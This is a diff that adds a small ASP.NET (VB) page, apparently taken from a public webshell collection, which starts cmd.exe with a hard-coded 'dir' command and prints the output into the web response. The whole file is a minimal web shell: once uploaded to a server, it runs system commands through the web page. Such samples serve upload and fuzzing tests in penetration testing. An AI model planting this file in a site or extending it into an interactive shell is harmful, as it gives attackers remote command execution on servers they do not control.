@@ -1,0 +1,23 @@
+<%@ Page Language="VB" Debug="true" %>
+<%@ import Namespace="system.IO" %>
+<%@ import Namespace="System.Diagnostics" %>
+
+<!-- sources: https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx -->
+
+<%
+
+Response.Write("Executing code.")
+
+Dim myProcess As New Process()            
+Dim myProcessStartInfo As New ProcessStartInfo("c:\windows\system32\cmd.exe")            
+myProcessStartInfo.UseShellExecute = false            
+myProcessStartInfo.RedirectStandardOutput = true            
+myProcess.StartInfo = myProcessStartInfo            
+myProcessStartInfo.Arguments="/c dir"
+myProcess.Start()            
+Dim myStreamReader As StreamReader = myProcess.StandardOutput            
+Dim myString As String = myStreamReader.Readtoend()            
+myProcess.Close()            
+Response.Write("<pre>" & mystring & "</pre>")
+
+%>
